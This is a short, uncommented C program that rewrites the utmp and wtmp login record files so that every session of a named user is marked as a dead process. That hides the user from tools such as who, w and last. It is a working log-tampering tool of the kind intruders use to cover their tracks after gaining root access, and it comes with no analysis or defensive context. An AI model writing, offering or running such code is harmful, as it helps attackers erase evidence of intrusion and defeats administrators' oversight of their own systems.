#include <stdio.h>
#include <utmp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>

dead (char *name_file, char *name_arg)
{
struct utmp pos;
int fd;
int dist;

dist=sizeof(struct utmp);

if ((fd=open(name_file, O_RDWR)) == -1) {
  perror (name_file);
  exit (1);
}

while (read(fd, &pos, dist) == dist)
{
  if (!strncmp(pos.ut_name, name_arg, sizeof(pos.ut_name)))
{
  pos.ut_type=DEAD_PROCESS;

  if (lseek(fd, -dist, SEEK_CUR) != -1)
    write (fd, &pos, dist);
  }
}

close (fd);
}

int main (int argc, char *argv[])
{

if (argc != 2)
{
  printf ("Usage: %s <user>\n\n", argv[0]);
  exit (1);
}

dead (UTMP_FILE, argv[1]); 
dead (WTMP_FILE, argv[1]);

return 0;
}

